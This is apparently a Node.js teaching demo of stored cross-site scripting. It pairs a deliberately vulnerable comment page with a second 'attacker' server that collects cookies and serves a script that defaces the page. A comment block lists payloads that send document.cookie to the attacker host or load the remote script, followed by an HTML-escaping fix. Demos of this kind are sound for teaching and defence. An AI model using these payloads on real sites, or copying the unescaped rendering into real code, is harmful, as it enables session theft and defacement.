const http = require('http')
const URL = require('url')
const qs = require('querystring')

// 模拟文章数据库
const article = {
  id: 1,
  title: '体育新闻',
  content:
    '火箭在对阵雷霆首轮系列赛的第5场比赛中以114-80战胜对手，但在这场比赛中更受关注的还是丹尼斯-施罗德和PJ塔克之间的冲突导致两人都被驱逐，当然，在这场比赛之后火箭已经手握3-2的领先优势。',
  comments: ['评论1', '评论2'],
}

// HTML 模板
function renderHTML(tpl) {
  return `<!DOCTYPE html><html><head><meta charset="UTF-8"/></head><body>${tpl}</body></html>`
}

// 路由分发器
const routes = {
  'GET /articles/1': (req, res) => {
    const tpl = `
    <div style="width: 500px;margin: auto;">
      <h1>${article.title}</h1>
      <p>${article.content}</p>
      <h3>评论区</h3>
      <ul>${article.comments
        .map((item) => '<li>' + item + '</li>')
        .join('')}</ul>
      <hr/>
      <p>请发表您的评论：</p>
      <form action="/comments" method="post">
        <textarea lines="3" maxlength="1000" name="comment" ></textarea>
        <button type="submit">提交</button>
      </form>
    </div>
    `
    res.setHeader('Set-Cookie', ['name=keliq', 'age=10'])
    res.end(renderHTML(tpl))
  },
  'POST /comments': async (req, res) => {
    let body = await getBody(req)
    let { comment = '' } = qs.parse(body)
    comment = comment.trim()
    if (comment) {
      // 为防止内存溢出，只保留最新10条评论
      article.comments = [comment, ...article.comments.slice(0, 9)]
    }
    res.writeHead(301, { Location: '/articles/1' })
    res.end()
  },
  'GET /cookies': (req, res) => {
    console.log(req.query)
    res.end()
  },
  'GET /malicious.js': (req, res) => {
    const script = `document.body.innerHTML = '美女荷棺在线發牌<img width=200 src="http://img.zlib.cn/beauty/1.jpg" />'`
    res.end(script)
  },
}

// 获取 req.body
function getBody(req) {
  return new Promise((resolve, reject) => {
    const arr = []
    req
      .on('data', (data) => arr.push(data))
      .on('end', () =>
        resolve(decodeURIComponent(Buffer.concat(arr).toString()))
      )
      .on('error', reject)
  })
}

function onRequest(req, res) {
  const { url, method } = req
  const { query, pathname } = URL.parse(url, true) // 解析 url
  Object.assign(req, { query, path: pathname }) // 并把 query 和 pathname 参数扩展到 req 对象
  const route = routes[[method, pathname].join(' ')] // 获取路由处理函数（策略模式）
  if (route) return route(req, res)
  res.statusCode = 404
  res.end('Not Found')
}

http.createServer(onRequest).listen(3000) // 被攻击的网站
http.createServer(onRequest).listen(4000) // 攻击者收集cookie的服务器


/*

运行方式：node stored.js
访问地址：http://localhost:3000/articles/1

攻击代码：
文章写的真棒！<script>fetch(`http://localhost:4000/cookies?cookie=${document.cookie}`)</script>
文章写的真棒！<script src="http://localhost:4000/malicious.js"></script>

防御代码：
function encodeHTML(str) {
  return str
  .replace(/&/g,'&amp;')
  .replace(/"/g,'&quot;')
  .replace(/'/g,'&apos;')
  .replace(/</g,'&lt;')
  .replace(/>/g,'&gt;')
}
article.comments = [encodeHTML(comment), ...article.comments.slice(0, 9)]
*/


function encodeHTML(str) {
  return str
  .replace(/&/g,'&amp;')
  .replace(/"/g,'&quot;')
  .replace(/'/g,'&apos;')
  .replace(/</g,'&lt;')
  .replace(/>/g,'&gt;')
}